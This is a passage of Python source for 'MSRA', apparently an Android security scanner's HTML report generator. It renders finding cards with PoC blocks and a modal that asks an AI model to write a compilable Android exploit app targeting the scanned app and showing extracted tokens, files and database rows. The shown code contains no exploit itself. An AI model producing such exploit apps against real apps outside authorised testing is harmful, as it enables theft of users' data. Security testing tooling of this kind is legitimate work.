  background: rgba(234,179,8,0.04); border: 1px solid rgba(234,179,8,0.18);
  border-radius: var(--radius-sm); padding: 14px 18px 14px 14px;
}}
.fp-block ul {{ padding-left: 22px; color: var(--text2); font-size: 13px; }}
.fp-block li {{ margin: 6px 0; line-height: 1.6; }}
.fp-block li::marker {{ color: #fbbf24; }}

/* Occurrences */
.occurrences-block {{
  background: var(--bg); border: 1px solid var(--border2);
  border-radius: var(--radius-sm); padding: 12px 16px;
  display: flex; flex-wrap: wrap; gap: 8px;
}}
.occ-row {{ display: inline-flex; align-items: center; }}
.occ-line {{
  background: var(--bg3); border: 1px solid var(--border);
  padding: 3px 10px; border-radius: 4px;
  font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text2);
}}

/* ── FOOTER ── */
.footer {{
  border-top: 1px solid var(--border);
  padding: 20px 32px;
  display: flex; align-items: center; justify-content: space-between;
  color: var(--text3); font-size: 12px;
  max-width: 1280px; margin: 0 auto;
}}
.footer strong {{ color: var(--text2); }}

/* Scrollbar */
::-webkit-scrollbar {{ width: 6px; height: 6px; }}
::-webkit-scrollbar-track {{ background: var(--bg2); }}
::-webkit-scrollbar-thumb {{ background: var(--border); border-radius: 3px; }}
::-webkit-scrollbar-thumb:hover {{ background: #444c56; }}

/* ── CLAUDE POC MODAL ── */
.poc-modal-overlay {{
  display: none; position: fixed; inset: 0; z-index: 1000;
  background: rgba(0,0,0,0.75); backdrop-filter: blur(4px);
  align-items: flex-start; justify-content: center;
  padding: 40px 20px; overflow-y: auto;
}}
.poc-modal-overlay.open {{ display: flex; }}
.poc-modal {{
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: var(--radius); width: 100%; max-width: 900px;
  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
  display: flex; flex-direction: column; max-height: 88vh;
}}
.poc-modal-head {{
  padding: 20px 24px 16px; border-bottom: 1px solid var(--border);
  display: flex; align-items: flex-start; gap: 14px; flex-shrink: 0;
}}
.poc-modal-head .modal-icon {{
  width: 40px; height: 40px; border-radius: 8px;
  background: rgba(139,92,246,0.15); border: 1px solid rgba(139,92,246,0.3);
  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
  color: #a78bfa; font-size: 18px;
}}
.poc-modal-head .modal-title {{ font-size: 16px; font-weight: 700; margin-bottom: 4px; }}
.poc-modal-head .modal-sub  {{ font-size: 12px; color: var(--text2); }}
.poc-modal-close {{
  margin-left: auto; background: none; border: none; cursor: pointer;
  color: var(--text3); font-size: 18px; padding: 4px; transition: color .15s;
  flex-shrink: 0;
}}
.poc-modal-close:hover {{ color: var(--text); }}
.poc-modal-body {{ padding: 24px; overflow-y: auto; flex: 1; }}
.poc-modal-foot {{
  padding: 16px 24px; border-top: 1px solid var(--border);
  display: flex; align-items: center; gap: 10px; flex-wrap: wrap; flex-shrink: 0;
}}

/* API key prompt */
.api-key-row {{
  background: rgba(47,129,247,.06); border: 1px solid rgba(47,129,247,.2);
  border-radius: 8px; padding: 14px 18px; margin-bottom: 20px;
  display: flex; flex-direction: column; gap: 8px;
}}
.api-key-row label {{ font-size: 12px; font-weight: 600; color: var(--text2); }}
.api-key-row input {{
  background: var(--bg); border: 1px solid var(--border);
  color: var(--text); border-radius: 6px; padding: 8px 12px;
  font-size: 13px; font-family: 'JetBrains Mono', monospace; outline: none;
  width: 100%;
}}
.api-key-row input:focus {{ border-color: var(--accent); }}

/* Generating spinner */
.gen-spinner {{
  display: flex; flex-direction: column; align-items: center;
  justify-content: center; padding: 60px 20px; gap: 16px;
}}
.gen-spinner .spin-icon {{
  width: 56px; height: 56px; border-radius: 50%;
  border: 3px solid var(--bg3); border-top-color: #a78bfa;
  animation: spin 0.8s linear infinite;
}}
@keyframes spin {{ to {{ transform: rotate(360deg); }} }}
.gen-spinner p {{ color: var(--text2); font-size: 14px; text-align: center; }}

/* File tabs inside modal */
.file-tabs {{
  display: flex; gap: 0; border-bottom: 1px solid var(--border);
  margin-bottom: 0; overflow-x: auto; flex-shrink: 0;
}}
.file-tab {{
  padding: 9px 16px; font-size: 12px; font-weight: 500; cursor: pointer;
  border: none; background: transparent; color: var(--text2);
  border-bottom: 2px solid transparent; margin-bottom: -1px;
  white-space: nowrap; font-family: 'JetBrains Mono', monospace;
  transition: color .15s;
}}
.file-tab:hover {{ color: var(--text); }}
.file-tab.active {{ color: #a78bfa; border-bottom-color: #a78bfa; }}
.file-panes {{ flex: 1; overflow: auto; min-height: 300px; }}
.file-pane {{ display: none; height: 100%; }}
.file-pane.active {{ display: block; }}
.file-pane pre {{ margin: 0 !important; border-radius: 0 !important; min-height: 300px; }}
.file-pane pre code {{ padding: 18px !important; font-size: 12.5px !important; line-height: 1.65 !important; }}

/* Generate PoC button (in finding card) */
.gen-poc-btn {{
  display: inline-flex; align-items: center; gap: 7px;
  padding: 9px 18px; border-radius: 6px; font-size: 13px; font-weight: 600;
  cursor: pointer; border: 1px solid rgba(139,92,246,0.4);
  background: rgba(139,92,246,0.1); color: #a78bfa;
  transition: all .15s; font-family: inherit;
}}
.gen-poc-btn:hover {{ background: rgba(139,92,246,0.2); border-color: rgba(139,92,246,0.6); }}
.gen-poc-btn i {{ font-size: 14px; }}
.poc-gen-note {{
  font-size: 11px; color: var(--text3); margin-top: 10px;
  display: flex; align-items: center; gap: 5px;
}}

/* Error state in modal */
.modal-error {{
  background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25);
  border-radius: 8px; padding: 16px 18px; color: #f87171; font-size: 13px;
}}
</style>
</head>
<body>

<!-- TOP NAV -->
<nav class="topnav">
  <div class="topnav-brand">
    <i class="fa-solid fa-shield-halved"></i>
    MSRA
  </div>
  <span class="topnav-pkg">{html.escape(pkg)}</span>
  <div class="topnav-spacer"></div>
  <div class="topnav-meta">
    <span><i class="fa-regular fa-file-code"></i> {html.escape(apk_name)}</span>
    <span><i class="fa-regular fa-clock"></i> {created}</span>
    <span><i class="fa-solid fa-bullseye"></i> {total} findings</span>
    <button class="btn btn-primary" onclick="exportReport()">
      <i class="fa-solid fa-download"></i> Export JSON
    </button>
  </div>
</nav>

<div class="main">

  <!-- SUMMARY -->
  <div class="summary-grid">
    <div class="stats-grid">
      <div class="stat-card critical">
        <div class="stat-icon"><i class="fa-solid fa-skull-crossbones"></i></div>
        <div class="stat-num">{sev_counts["Critical"]}</div>
        <div class="stat-lbl">Critical</div>
        <div class="stat-meta">Immediate action required</div>
      </div>
      <div class="stat-card high">
        <div class="stat-icon"><i class="fa-solid fa-circle-exclamation"></i></div>
        <div class="stat-num">{sev_counts["High"]}</div>
        <div class="stat-lbl">High</div>
        <div class="stat-meta">Fix before next release</div>
      </div>
      <div class="stat-card medium">
        <div class="stat-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
        <div class="stat-num">{sev_counts["Medium"]}</div>
        <div class="stat-lbl">Medium</div>
        <div class="stat-meta">Plan remediation</div>
      </div>
      <div class="stat-card low">
        <div class="stat-icon"><i class="fa-solid fa-circle-info"></i></div>
        <div class="stat-num">{sev_counts["Low"]}</div>
        <div class="stat-lbl">Low</div>
        <div class="stat-meta">Best practice</div>
      </div>
      <div class="stat-card info">
        <div class="stat-icon"><i class="fa-solid fa-magnifying-glass"></i></div>
        <div class="stat-num">{sev_counts["Info"]}</div>
        <div class="stat-lbl">Info</div>
        <div class="stat-meta">Informational</div>
      </div>
    </div>
  </div><!-- /summary-grid -->

  <!-- FILTER BAR -->
  <div class="filter-bar">
    <div class="search-wrap">
      <i class="fa-solid fa-magnifying-glass"></i>
      <input type="search" id="searchInput" placeholder="Search findings…" oninput="applyFilters()">
    </div>
    <select id="sevFilter" onchange="applyFilters()">
      <option value="">All Severities</option>
      <option value="critical">Critical</option>
      <option value="high">High</option>
      <option value="medium">Medium</option>
      <option value="low">Low</option>
      <option value="info">Info</option>
    </select>
    <select id="catFilter" onchange="applyFilters()">
      <option value="">All Categories</option>
      {cat_options}
    </select>
    <select id="typeFilter" onchange="applyFilters()">
      <option value="">All Types</option>
      <option value="deep">Deep Analysis</option>
      <option value="pattern">Pattern Match</option>
    </select>
    <select id="confFilter" onchange="applyFilters()">
      <option value="">All Confidence</option>
      <option value="high">High Confidence Only</option>
      <option value="medium">Medium+ Confidence</option>
    </select>
    <div class="divider"></div>
    <button class="btn" onclick="expandAll()"><i class="fa-solid fa-chevron-down"></i> Expand All</button>
    <button class="btn" onclick="collapseAll()"><i class="fa-solid fa-chevron-up"></i> Collapse</button>
    <span id="resultCount">{total} findings</span>
  </div>

  <!-- FINDINGS -->
  <div class="findings-list" id="findingsList">
    {cards_html}
  </div>

</div><!-- /main -->

<footer class="footer">
  <span>Generated by <strong>MSRA</strong> &mdash; Built by Sai with love &#10084;</span>
  <span>{created} &nbsp;·&nbsp; {total} findings &nbsp;·&nbsp; <strong>{html.escape(pkg)}</strong></span>
</footer>

<script type="application/json" id="reportData">{embedded_json}</script>

<script>
hljs.highlightAll();

// ── TABS ──
document.querySelectorAll('.tab-btn').forEach(btn => {{
  btn.addEventListener('click', e => {{
    e.stopPropagation();
    const body = btn.closest('.card-body');
    body.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    body.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    btn.classList.add('active');
    body.querySelector('#' + btn.dataset.tab).classList.add('active');
  }});
}});

// ── EXPAND / COLLAPSE ──
document.querySelectorAll('.card-header').forEach(h => {{
  h.addEventListener('click', () => h.closest('.finding-card').classList.toggle('is-open'));
}});

function expandAll()  {{ document.querySelectorAll('.finding-card').forEach(c => c.classList.add('is-open')); }}
function collapseAll(){{ document.querySelectorAll('.finding-card').forEach(c => c.classList.remove('is-open')); }}

// Open first critical/high by default
const first = document.querySelector('.finding-card.sev-critical, .finding-card[data-sev="critical"], .finding-card[data-sev="high"]');
if (first) first.classList.add('is-open');
document.querySelectorAll('.finding-card').forEach((c,i) => {{ if(i===0) c.classList.add('is-open'); }});

// ── COPY PoC ──
document.querySelectorAll('.copy-poc-btn').forEach(btn => {{
  btn.addEventListener('click', e => {{
    e.stopPropagation();
    const code = btn.closest('.poc-block').querySelector('code');
    navigator.clipboard.writeText(code ? code.innerText : '');
    btn.innerHTML = '<i class="fa-solid fa-check"></i> Copied';
    setTimeout(() => btn.innerHTML = '<i class="fa-regular fa-copy"></i> Copy', 2000);
  }});
}});

// ── FILTERS ──
function applyFilters() {{
  const q    = document.getElementById('searchInput').value.toLowerCase();
  const sev  = document.getElementById('sevFilter').value;
  const cat  = document.getElementById('catFilter').value;
  const typ  = document.getElementById('typeFilter').value;
  const conf = document.getElementById('confFilter').value;
  let visible = 0;
  document.querySelectorAll('.finding-card').forEach(card => {{
    const cs  = card.dataset.sev  || '';
    const cc  = card.dataset.cat  || '';
    const cf  = card.dataset.conf || '';
    const cd  = card.dataset.deep === 'true';
    const txt = card.textContent.toLowerCase();
    const confOk = (!conf
        || (conf === 'high' && cf === 'high')
        || (conf === 'medium' && (cf === 'high' || cf === 'medium')));
    const ok  = (!q || txt.includes(q))
             && (!sev || cs === sev)
             && (!cat || cc === cat)
             && (!typ || (typ==='deep' && cd) || (typ==='pattern' && !cd))
             && confOk;
    card.style.display = ok ? '' : 'none';
    if (ok) visible++;
  }});
  document.getElementById('resultCount').textContent = visible + ' finding' + (visible!==1?'s':'');
}}

// ── EXPORT ──
function exportReport() {{
  const raw = document.getElementById('reportData').textContent;
  const blob = new Blob([raw], {{type:'application/json'}});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = '{pkg}_msra_report.json';
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
}}

// ── CLAUDE POC GENERATOR ──
// Only active when served by the MSRA web server
const IS_HOSTED = typeof window.__MSRA_HOSTED !== 'undefined' && window.__MSRA_HOSTED;

// Resolve API key: sidebar localStorage → server env var (no modal entry needed)
function _resolveApiKey() {{
  const API_KEY_STORAGE = 'msra_anthropic_key';
  return localStorage.getItem(API_KEY_STORAGE) || '';
}}

function openPocModal(idx) {{
  if (!IS_HOSTED) {{
    alert('Claude PoC generation requires the MSRA web server.\\n\\nStart it with: python server.py');
    return;
  }}
  const modal = document.getElementById('pocModal');
  modal.dataset.findingIdx = idx;
  modal.classList.add('open');

  // Hide the modal key row — key is managed in the sidebar
  const keyRow = document.getElementById('apiKeyRow');
  if (keyRow) keyRow.style.display = 'none';

  // Show warning if no key available at all
  const hasKey = !!_resolveApiKey() ||
    (typeof window.__API_KEY_CONFIGURED !== 'undefined' && window.__API_KEY_CONFIGURED);
  const noKeyWarning = document.getElementById('modalNoKeyWarning');
  if (noKeyWarning) noKeyWarning.style.display = hasKey ? 'none' : 'flex';

  showModalState('ready');
}}

function closePocModal() {{
  const modal = document.getElementById('pocModal');
  modal.classList.remove('open');
  showModalState('ready');
}}

function showModalState(state) {{
  document.getElementById('modalReady').style.display     = state === 'ready'      ? 'block' : 'none';
  document.getElementById('modalGenerating').style.display= state === 'generating' ? 'flex'  : 'none';
  document.getElementById('modalResult').style.display    = state === 'result'     ? 'flex'  : 'none';
  document.getElementById('modalError').style.display     = state === 'error'      ? 'block' : 'none';
  document.getElementById('modalFooterGenerate').style.display = state === 'ready' ? '' : 'none';
  document.getElementById('modalFooterDownload').style.display = state === 'result'? '' : 'none';
}}

function runPocGeneration() {{
  const modal   = document.getElementById('pocModal');
  const idx     = parseInt(modal.dataset.findingIdx);
  // Key comes from the sidebar localStorage field
  const apiKey  = _resolveApiKey();

  // Pull finding data from embedded JSON
  const reportData = JSON.parse(document.getElementById('reportData').textContent);
  const finding    = reportData.findings[idx] || {{}};
  const pkg        = reportData.package || '';

  const body = {{
    api_key:     apiKey,
    package:     pkg,
    title:       finding.title || '',
    description: finding.description || '',
    severity:    finding.severity || '',
    category:    finding.category || '',
    component:   (finding.evidence && finding.evidence.file) ? finding.evidence.file.split('/').pop().replace(/\.(java|kt)$/,'') : '',
    authority:   pkg + '.provider',
    snippet:     finding.evidence ? (finding.evidence.snippet || '') : '',
    file_path:   finding.evidence ? (finding.evidence.file || '') : '',
    poc_text:    finding.poc || '',
    attack_path: finding.attack_path || '',
  }};

  showModalState('generating');

  fetch('/api/generate-poc', {{
    method:  'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body:    JSON.stringify(body),
  }})
  .then(r => r.json())
  .then(data => {{
    if (data.error) {{
      document.getElementById('modalErrorMsg').textContent = data.error;
      showModalState('error');
      return;
    }}
    renderPocFiles(data.files || []);
    modal.dataset.pocFiles = JSON.stringify(data.files || []);
    showModalState('result');
    // Highlight all new code blocks
    document.querySelectorAll('#modalResult pre code').forEach(b => hljs.highlightElement(b));
  }})
  .catch(e => {{
    document.getElementById('modalErrorMsg').textContent = e.message;
    showModalState('error');
  }});
}}

function renderPocFiles(files) {{
  const tabBar  = document.getElementById('pocFileTabs');
  const paneArea= document.getElementById('pocFilePanes');
  tabBar.innerHTML  = '';
  paneArea.innerHTML= '';
  files.forEach((f, i) => {{
    const tab = document.createElement('button');
    tab.className   = 'file-tab' + (i===0?' active':'');
    tab.textContent = f.name;
    tab.onclick     = () => switchFileTab(i);
    tabBar.appendChild(tab);

    const pane = document.createElement('div');
    pane.className = 'file-pane' + (i===0?' active':'');
    pane.id = 'fpane-' + i;
    const lang = f.language || 'text';
    pane.innerHTML = `<pre><code class="language-${{lang}}">${{escHtml(f.content)}}</code></pre>`;
    paneArea.appendChild(pane);
  }});
}}

function switchFileTab(idx) {{
  document.querySelectorAll('#pocFileTabs .file-tab').forEach((t,i)  => t.classList.toggle('active', i===idx));
  document.querySelectorAll('#pocFilePanes .file-pane').forEach((p,i) => p.classList.toggle('active', i===idx));
}}

function downloadPocZip() {{
  const modal = document.getElementById('pocModal');
  const files = JSON.parse(modal.dataset.pocFiles || '[]');
  if (!files.length) return;
  const scanId = window.location.pathname.split('/').pop() || 'report';
  fetch(`/api/download-poc/${{scanId}}`, {{
    method:  'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body:    JSON.stringify({{ files }}),
  }})
  .then(r => r.blob())
  .then(blob => {{
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `poc_${{scanId}}.zip`;
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
  }});
}}

function escHtml(s) {{
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}}

// Close modal on overlay click
document.addEventListener('click', e => {{
  const overlay = document.getElementById('pocModal');
  if (e.target === overlay) closePocModal();
}});
document.addEventListener('keydown', e => {{ if (e.key === 'Escape') closePocModal(); }});
</script>

<!-- ── CLAUDE POC MODAL ── -->
<div class="poc-modal-overlay" id="pocModal">
  <div class="poc-modal">
    <div class="poc-modal-head">
      <div class="modal-icon"><i class="fa-solid fa-wand-magic-sparkles"></i></div>
      <div>
        <div class="modal-title">Generate PoC Android App</div>
        <div class="modal-sub">Claude AI will generate a complete, compilable Android exploit app targeting this specific vulnerability</div>
      </div>
      <button class="poc-modal-close" onclick="closePocModal()"><i class="fa-solid fa-xmark"></i></button>
    </div>

    <div class="poc-modal-body">

      <!-- READY STATE -->
      <div id="modalReady">
        <!-- Warning shown if no key is configured anywhere -->
        <div id="modalNoKeyWarning" style="display:none;
             background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.25);
             border-radius:8px;padding:12px 16px;margin-bottom:16px;
             align-items:center;gap:10px;font-size:13px;color:#fbbf24">
          <i class="fa-solid fa-triangle-exclamation"></i>
          <span>No API key configured. Add your Anthropic key in the sidebar to enable generation.</span>
        </div>
        <div style="color:var(--text2);font-size:13.5px;line-height:1.7">
          <p>Click <strong>Generate</strong> — Claude will produce a complete Android Studio project that:</p>
          <ul style="padding-left:20px;margin-top:10px;color:var(--text2);font-size:13px">
            <li style="margin:6px 0">Uses the real package name, component names, and authority URIs from this scan</li>
            <li style="margin:6px 0">Implements the actual exploit technique for this specific vulnerability</li>
            <li style="margin:6px 0">Displays extracted data (tokens, file contents, DB rows) in a simple UI</li>
            <li style="margin:6px 0">Ready to open in Android Studio and sideload onto a test device</li>
          </ul>
          <p style="margin-top:14px;font-size:12px;color:var(--text3)">
            <i class="fa-solid fa-circle-info"></i>
            &nbsp;Generation takes ~15–30 seconds. For authorized security testing only.
          </p>
        </div>
      </div>

      <!-- GENERATING STATE -->
      <div id="modalGenerating" style="display:none" class="gen-spinner">
        <div class="spin-icon"></div>
        <p>Claude is writing your exploit app…<br><span style="font-size:11px;color:var(--text3)">This usually takes 15–30 seconds</span></p>
      </div>

      <!-- RESULT STATE -->
      <div id="modalResult" style="display:none;flex-direction:column;gap:0;height:100%">
        <div style="padding:0 0 12px;font-size:13px;color:var(--text2)">
          <i class="fa-solid fa-circle-check" style="color:var(--low)"></i>
          &nbsp;Generated successfully — open in Android Studio or download as ZIP
        </div>
        <div class="file-tabs" id="pocFileTabs"></div>
        <div class="file-panes" id="pocFilePanes"></div>
      </div>

      <!-- ERROR STATE -->
      <div id="modalError" style="display:none" class="modal-error">
        <i class="fa-solid fa-triangle-exclamation"></i>
        &nbsp;<span id="modalErrorMsg">An error occurred.</span>
        <div style="margin-top:10px;font-size:12px;color:var(--text3)">
          Check that your API key is valid and try again.
        </div>
      </div>

    </div><!-- /modal-body -->

    <div class="poc-modal-foot">
      <div id="modalFooterGenerate" style="display:flex;align-items:center;gap:10px;width:100%">
        <button class="gen-poc-btn" onclick="runPocGeneration()" style="padding:10px 24px;font-size:14px">
          <i class="fa-solid fa-wand-magic-sparkles"></i> Generate PoC App
        </button>
        <button class="btn" onclick="closePocModal()">Cancel</button>
        <span style="margin-left:auto;font-size:11px;color:var(--text3)">
          Powered by <strong style="color:var(--text2)">Claude Sonnet 4.6</strong>
        </span>
      </div>
      <div id="modalFooterDownload" style="display:none;align-items:center;gap:10px;width:100%">
        <button class="btn btn-primary" onclick="downloadPocZip()">
          <i class="fa-solid fa-download"></i> Download ZIP
        </button>
        <button class="btn" onclick="showModalState('ready');runPocGeneration()">
          <i class="fa-solid fa-rotate"></i> Regenerate
        </button>
        <button class="btn" onclick="closePocModal()" style="margin-left:auto">Close</button>
      </div>
    </div>
  </div>
</div>

</body>
</html>'''

    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(html_content)


def _render_finding(finding, index: int, package: str) -> str:
    severity  = (_get_attr(finding, 'severity') or "Medium").lower()
    extra     = _get_attr(finding, 'extra') or {}
    if not isinstance(extra, dict):
        extra = {}
    category  = extra.get("category", "Other")
    is_deep   = extra.get("deep_analysis", False)
    title_txt = _get_attr(finding, 'title') or 'Unknown Finding'
    desc      = _get_attr(finding, 'description') or ''
    attack    = _get_attr(finding, 'attack_path') or ''
    refs      = _get_attr(finding, 'references') or []
    cwe_list  = extra.get('cwe', [])
    remediation = extra.get('remediation', '') or ''

    # Reviewer-context fields (added by finding_enrichment)
    confidence    = extra.get('confidence', 'medium')
    code_class    = extra.get('code_class', 'app')
    why_matters   = extra.get('why_it_matters', '')
    how_verify    = extra.get('how_to_verify', []) or []
    code_analysis = extra.get('code_analysis', '')
    fp_check      = extra.get('false_positive_check', []) or []
    occurrences   = extra.get('occurrences', []) or []

    sev_icon  = _severity_icon(severity)
    cat_icon  = _category_icon(category)

    # ── EVIDENCE ──
    evidence  = _get_attr(finding, 'evidence')
    evidence_html = ''
    if evidence:
        fp = _get_attr(evidence, 'file_path') or ''
        if '/sources/' in fp:
            display_fp = 'sources/' + fp.split('/sources/')[-1]
        elif '/resources/' in fp:
            display_fp = 'resources/' + fp.split('/resources/')[-1]
        else:
            display_fp = fp
        line_num = _get_attr(evidence, 'line_number') or _get_attr(evidence, 'line') or 0
        snippet  = _get_attr(evidence, 'snippet') or ''
        evidence_html = f'''
<div class="section-heading"><i class="fa-solid fa-map-pin"></i> Vulnerable Location</div>
<div class="evidence-block">
  <div class="evidence-file">
    <i class="fa-regular fa-file-code" style="color:var(--accent)"></i>
    <span>{html.escape(str(display_fp))}</span>
    <span class="line-badge"><i class="fa-solid fa-hashtag"></i> Line {line_num}</span>
  </div>
  <div class="evidence-snippet">
    <pre><code class="language-java">{html.escape(str(snippet))}</code></pre>
  </div>
</div>'''

    # ── ADDITIONAL OCCURRENCES (from grouping) ──
    occ_html = ''
    if len(occurrences) > 1:
        occ_items = ''.join(
            f'<div class="occ-row"><span class="occ-line">Line {o.get("line",0)}</span></div>'
            for o in occurrences[1:21]  # cap display at 20
        )
        more = ''
        if len(occurrences) > 21:
            more = f'<div class="occ-row"><span class="occ-line">+ {len(occurrences)-21} more</span></div>'
        occ_html = f'''
<div class="section-heading" style="margin-top:14px"><i class="fa-solid fa-list-ol"></i> Other Occurrences in Same Class ({len(occurrences)} total)</div>
<div class="occurrences-block">{occ_items}{more}</div>'''

    # ── PoC ──
    poc_text = _build_poc(finding, package)
    poc_lang = 'language-java' if any(k in poc_text for k in ['Intent', 'ComponentName', 'startActivity', 'putExtra']) else 'language-bash'
    poc_html = f'''
<div class="poc-block">
  <div class="poc-header-bar">
    <div class="dots">
      <div class="dot dot-red"></div>
      <div class="dot dot-yellow"></div>
      <div class="dot dot-green"></div>
    </div>
    <span>Proof of Concept &nbsp;·&nbsp; {html.escape(package)}</span>
    <button class="copy-poc-btn"><i class="fa-regular fa-copy"></i> Copy</button>
  </div>
  <div class="poc-code">
    <pre><code class="{poc_lang}">{html.escape(poc_text)}</code></pre>
  </div>
</div>'''

    # ── ATTACK SCENARIO ──
    attack_html = ''
    attack_steps = extra.get('attack_steps') or []
    if attack or attack_steps:
        steps_html = ''
        if attack_steps:
            def _strip_step_num(s: str) -> str:
                return re.sub(r'^\s*\d+[.)]\s*', '', s).strip()
            items = ''.join(f'<li>{html.escape(_strip_step_num(str(s)))}</li>' for s in attack_steps)
            steps_html = f'<div class="atk-steps"><ol>{items}</ol></div>'
        elif attack:
            # Auto-detect numbered steps
            steps = [l.strip() for l in attack.split('\n') if l.strip()]
            if any(l[0].isdigit() for l in steps[:3]):
                items = ''.join(f'<li>{html.escape(l.lstrip("0123456789. "))}</li>' for l in steps if l.strip())
                steps_html = f'<div class="atk-steps"><ol>{items}</ol></div>'
            else:
                steps_html = f'<p style="color:var(--text2);font-size:13px;line-height:1.7">{html.escape(attack)}</p>'
        attack_html = f'''
<div class="section-heading" style="margin-top:16px"><i class="fa-solid fa-person-running"></i> Attack Scenario</div>
<div class="attack-block">{steps_html}</div>'''

    # ── WEBVIEW CONFIG ──
    wv_html = ''
    wv = extra.get('webview_config') or {}
    if wv:
        def wv_cell(label, val, danger_cond):
            cls = 'danger' if danger_cond else 'safe'
            val_str = str(val)
            return f'<div class="wv-cell {cls}"><div class="wc-label">{label}</div><div class="wc-val">{html.escape(val_str)}</div></div>'
        wv_html = f'''
<div class="section-heading" style="margin-top:16px"><i class="fa-solid fa-globe"></i> WebView Security Configuration</div>
<div class="wv-grid">
  {wv_cell("JavaScript", "Enabled ⚠" if wv.get("js_enabled") else "Disabled ✓", wv.get("js_enabled"))}
  {wv_cell("File Access", "Enabled ⚠" if wv.get("file_access") else "Disabled ✓", wv.get("file_access"))}
  {wv_cell("Universal Access", "Enabled ⚠" if wv.get("universal_access") else "Disabled ✓", wv.get("universal_access"))}
  {wv_cell("SSL Bypass", "Yes ⚠" if wv.get("ssl_bypass") else "No ✓", wv.get("ssl_bypass"))}
  {wv_cell("JS Interfaces", str(wv.get("js_interfaces", 0)), int(wv.get("js_interfaces", 0)) > 0)}
  {wv_cell("Ctrl. URLs", str(wv.get("controllable_urls", 0)), int(wv.get("controllable_urls", 0)) > 0)}
</div>'''

    # ── CWE + REFS ──
    meta_html = ''
    chips = []
    for cwe in cwe_list:
        chips.append(f'<span class="cwe-chip"><i class="fa-solid fa-tag"></i>{html.escape(str(cwe))}</span>')
    for ref in refs:
        label = re.sub(r'https?://(www\.)?', '', str(ref)).split('/')[0]
        chips.append(f'<a class="ref-link" href="{html.escape(str(ref))}" target="_blank" rel="noopener"><i class="fa-solid fa-arrow-up-right-from-square"></i>{html.escape(label)}</a>')
    if chips:
        meta_html = f'<div class="ref-chips">{"".join(chips)}</div>'

    # ── REMEDIATION ──
    rem_html = ''
    if remediation:
        rem_html = f'''
<div class="section-heading"><i class="fa-solid fa-wrench"></i> Remediation</div>
<div class="remediation-block">{html.escape(str(remediation))}</div>
{meta_html}'''
    elif meta_html:
        rem_html = meta_html

    # ── DEEP / CONFIDENCE / CODE-CLASS BADGES ──
    deep_badge = ''
    if is_deep:
        deep_badge = '<span class="deep-chip"><i class="fa-solid fa-microscope"></i> Deep Analysis</span>'

    confidence_badge = f'<span class="conf-chip conf-{confidence}"><i class="fa-solid fa-chart-line"></i> {confidence.title()} Confidence</span>'

    code_class_badge = ''
    if code_class == 'library':
        code_class_badge = '<span class="loc-chip"><i class="fa-solid fa-cube"></i> Library Code</span>'
    elif code_class == 'obfuscated':
        code_class_badge = '<span class="loc-chip"><i class="fa-solid fa-cube"></i> Obfuscated</span>'

    occ_badge = ''
    if len(occurrences) > 1:
        occ_badge = f'<span class="cat-chip"><i class="fa-solid fa-layer-group"></i> {len(occurrences)} locations</span>'

    # ── REVIEWER CONTEXT TAB ──
    reviewer_html = ''
    if why_matters or how_verify or code_analysis or fp_check:
        wm_html = ''
        if why_matters:
            wm_html = f'''
<div class="section-heading"><i class="fa-solid fa-bullseye"></i> Why This Matters</div>
<div class="reviewer-block">{html.escape(why_matters)}</div>'''

        ca_html = ''
        if code_analysis:
            ca_html = f'''
<div class="section-heading" style="margin-top:14px"><i class="fa-solid fa-code"></i> What the Scanner Detected</div>
<div class="reviewer-block">{html.escape(code_analysis)}</div>'''

        hv_html = ''
        if how_verify:
            items = ''.join(f'<li>{html.escape(str(s))}</li>' for s in how_verify)
            hv_html = f'''
<div class="section-heading" style="margin-top:14px"><i class="fa-solid fa-list-check"></i> How to Verify (Step-by-Step)</div>
<div class="verify-block"><ol>{items}</ol></div>'''

        fp_html = ''
        if fp_check:
            items = ''.join(f'<li>{html.escape(str(s))}</li>' for s in fp_check)
            fp_html = f'''
<div class="section-heading" style="margin-top:14px"><i class="fa-solid fa-circle-question"></i> False Positive Checks</div>
<div class="fp-block"><ul>{items}</ul></div>'''

        reviewer_html = f'{wm_html}{ca_html}{hv_html}{fp_html}'

    has_reviewer = bool(reviewer_html)
    reviewer_tab_btn = ''
    reviewer_tab_pane = ''
    if has_reviewer:
        reviewer_tab_btn = f'<button class="tab-btn" data-tab="tab-reviewer-{index}"><i class="fa-solid fa-user-check"></i> Reviewer Notes</button>'
        reviewer_tab_pane = f'<div class="tab-pane" id="tab-reviewer-{index}">{reviewer_html}</div>'

    return f'''
<div class="finding-card" data-sev="{severity}" data-cat="{html.escape(category)}" data-deep="{str(is_deep).lower()}" data-conf="{confidence}" data-loc="{code_class}">
  <div class="card-header">
    <span class="sev-pill {severity}">
      <i class="fa-solid {sev_icon}"></i>
      {severity.upper()}
    </span>
    <div class="card-title">
      <span class="finding-num">#{index}</span>{html.escape(str(title_txt))}
    </div>
    <div class="card-meta">
      {confidence_badge}
      {code_class_badge}
      {occ_badge}
      {deep_badge}
      <span class="cat-chip">
        <i class="fa-solid {cat_icon}"></i>
        {html.escape(category)}
      </span>
    </div>
    <i class="fa-solid fa-chevron-down chevron"></i>
  </div>
  <div class="card-body">
    <div class="tab-nav">
      <button class="tab-btn active" data-tab="tab-overview-{index}"><i class="fa-solid fa-circle-info"></i> Overview</button>
      {reviewer_tab_btn}
      <button class="tab-btn" data-tab="tab-exploit-{index}"><i class="fa-solid fa-terminal"></i> Exploit / PoC</button>
      <button class="tab-btn" data-tab="tab-remediation-{index}"><i class="fa-solid fa-shield-halved"></i> Remediation</button>
    </div>

    <!-- OVERVIEW TAB -->
    <div class="tab-pane active" id="tab-overview-{index}">
